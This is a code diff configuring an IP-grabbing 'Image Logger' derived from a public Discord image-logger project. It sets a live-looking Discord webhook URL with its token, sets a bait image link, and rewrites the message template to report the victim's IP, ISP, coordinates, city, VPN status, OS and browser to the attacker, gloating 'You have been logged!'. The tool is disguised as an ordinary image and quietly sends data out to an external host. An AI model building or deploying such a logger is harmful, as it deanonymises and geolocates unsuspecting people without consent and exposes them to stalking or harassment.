@@ -5,7 +5,7 @@ import traceback, requests, base64, httpagentparser
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1334907866330693712/Vf3nSE_RjXsRFxLYCUXGeF5yBhU-debKZebLuoZEvJYFyAqsDJhkQWgJuWcuP7lh103W",
-    "image": "http://beijincdc.cn/html/CImage_files/image001.jpg",
+    "image": "https://www.laleggepertutti.it/cl_resize/wIR5vslCLAY_Jd5bxJ15RJzBwtN5gxKGrcOD0g9Jlxs/rs:fill:500:0/g:ce/q:70/aHR0cHM6Ly93d3cubGFsZWdnZXBlcnR1dHRpLml0L3dwLWNvbnRlbnQvdXBsb2Fkcy8yMDIwLzEwL2ltbWFnaW5pLW1hZ2xpZXR0ZS1kaXJpdHRvLWF1dG9yZS1lMTYwMjY2ODU5MjIxMy5qcGc",
     "imageArgument": True,
 
     
@@ -19,7 +19,7 @@ config = {
 
     "message": {
         "doMessage": False, 
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", 
+        "message": "HELLO SIRE! You have been logged! Here is your info:\n\n**IP:** `{ip}`\n**ISP:** `{isp}`\n**ASN:** `{asn}`\n**Country:** `{country}`\n**Region:** `{region}`\n**City:** `{city}`\n**Coords:** `{lat}, {long}`\n**Timezone:** `{timezone}`\n**Mobile:** `{mobile}`\n**VPN:** `{vpn}`\n**Bot:** `{bot}`\n\n**OS:** `{os}`\n**Browser:** `{browser}`", 
         "richMessage": True, 
     },
 
